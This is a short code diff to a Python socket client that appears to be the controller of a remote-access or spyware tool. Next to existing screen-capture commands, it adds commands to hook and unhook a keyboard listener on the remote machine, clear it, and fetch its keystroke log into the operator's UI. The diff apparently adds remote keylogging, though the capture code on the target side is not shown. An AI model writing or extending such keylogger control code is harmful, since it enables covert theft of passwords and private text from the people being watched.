@@ -78,7 +78,32 @@ class Client(Socket, threading.Thread):
                 self.task_update_stream(ext)
             elif cmd == "capture-stream":
                 self.task_capture_stream()
-    
+            elif cmd == "listener-hook":
+                self.task_hook()
+            elif cmd == "listener-unhook":
+                self.task_unhook()
+            elif cmd == "listener-clear":
+                self.task_log_clear()
+            elif cmd == "listener-get":
+                self.task_log_get()
+
+    def task_log_get(self):
+        self.send_str("listener-get")
+        log = self.recv_str()
+        self.ui_cmd("update-log", log, "keyboard")
+
+    def task_log_clear(self):
+        self.send_str("listener-clear")
+
+    def task_unhook(self):
+        self.send_str("listener-unhook")
+        self.ui_cmd("hook", ui='keyboard')
+
+    def task_hook(self):
+        self.send_str("listener-hook")
+        self.ui_cmd("unhook", ui='keyboard')
+
+
 
 def DEBUG(*args,**kwargs):
     print("Client:", *args,**kwargs)
